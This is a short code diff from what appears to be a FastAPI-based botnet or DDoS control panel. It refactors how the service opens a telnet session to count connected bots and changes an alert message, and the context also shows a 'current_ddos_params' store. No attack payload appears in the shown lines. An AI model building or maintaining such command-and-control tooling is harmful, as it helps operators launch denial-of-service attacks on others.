@@ -62,7 +62,11 @@ async def ub_ip(ip: str = Query(...)):
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error unblocking IP: {str(e)}")
 
-from bot_count_service import start_telnet_session, get_bot_count_from_all_windows
+from bot_count_service import (
+    start_telnet_session,
+    get_bot_count_from_all_windows,
+    is_telnet_session_active,
+)
 from time import sleep
 
 
@@ -71,16 +75,14 @@ telnet_session_started = False
 async def count_connected_bots():
     global telnet_session_started
     try:
-        if not telnet_session_started:
+        if not is_telnet_session_active():
             start_telnet_session()
-            telnet_session_started = True
 
         bot_count = get_bot_count_from_all_windows()
         return JSONResponse(content={"message": f"{bot_count}"}, status_code=200)
-    
+
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error retrieving bot count: {str(e)}")
-
 
 current_ddos_params = {}
 
@@ -397,7 +399,7 @@ async def get():
                             if (data.message === "Bot count not found.") {
                                     alert(data.message);
                                 } else {
-                                    alert("Bots Connected: " + data.message);
+                                    alert("Bot Connected: " + data.message);
                                     // document.getElementById("botCountDisplay").innerText = `Connected Bots: ${data.message}`;
                                 } // Show the confirmation message to the user
                         })
